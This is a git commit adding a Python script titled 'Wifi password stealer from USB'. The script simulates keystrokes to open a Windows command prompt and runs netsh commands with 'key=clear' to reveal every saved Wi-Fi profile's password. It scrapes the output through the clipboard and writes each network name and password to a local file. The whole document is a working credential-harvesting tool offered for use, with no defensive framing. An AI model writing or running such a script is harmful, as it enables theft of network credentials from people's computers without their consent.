9659613b389eb8d06f045a00cd61d929e96d48dd
BigLlama <ruan.briers02@gmail.com>
2022-10-05 19:17:56 +0200

    Wifi password stealer from USB

---
+++ main.py
@@ -0,0 +1,91 @@
+from pynput.keyboard import Key, Controller
+import pyperclip
+import time
+
+keyboard = Controller()
+network_names = []
+string = []
+wifi_password = []
+
+
+def copy_all():
+    # select all
+    time.sleep(1)
+    keyboard.press(Key.ctrl)
+    keyboard.press('a')
+    keyboard.release(Key.ctrl)
+    keyboard.release('a')
+
+    # copy
+    keyboard.press(Key.ctrl)
+    keyboard.press('c')
+    keyboard.release(Key.ctrl)
+    keyboard.release('c')
+    time.sleep(1)
+
+
+def clear_cmd():
+    time.sleep(0.5)
+    keyboard.type("cls")
+    keyboard.press(Key.enter)
+    keyboard.release(Key.enter)
+
+
+#paste command to cmd
+keyboard.press(Key.cmd_l)
+keyboard.release(Key.cmd_l)
+time.sleep(0.1)
+keyboard.type("cmd")
+time.sleep(0.1)
+keyboard.press(Key.enter)
+keyboard.release(Key.enter)
+time.sleep(1)
+keyboard.type("netsh wlan show profile")
+keyboard.press(Key.enter)
+keyboard.release(Key.enter)
+time.sleep(1)
+
+copy_all()
+words = pyperclip.paste()
+names = words.split("All User Profile     : ")
+
+for i in range(len(names)):
+    if i == 0:
+        continue
+    network_names.append(names[i])
+
+
+for i in range(len(network_names)):
+    e = network_names[i].split("\r")
+    if network_names[i] == network_names[-1]:
+        e = network_names[i].split("\r\n\r\n\r\n")
+    string += e
+
+
+wifi_name = string[::2]
+for i in range(len(wifi_name)):
+    text = f'netsh wlan show profile name="{wifi_name[i]}" key=clear'
+    keyboard.type(text)
+    keyboard.press(Key.enter)
+    keyboard.release(Key.enter)
+
+    copy_all()
+    words = pyperclip.paste()
+    if "Key Content" not in words:
+        wifi_password.append("None")
+        clear_cmd()
+        continue
+    names = words.split("Key Content            : ")
+    password = names[1].split("\r\n\r\n")
+    wifi_password.append(password[0])
+    clear_cmd()
+
+time.sleep(0.1)
+keyboard.type("exit")
+keyboard.press(Key.enter)
+keyboard.release(Key.enter)
+
+f = open("passwords.txt", "w")
+for i in range(len(wifi_name)):
+    f.write(f'Wifi name: "{wifi_name[i]}" | Password: "{wifi_password[i]}"\n')
+f.close()
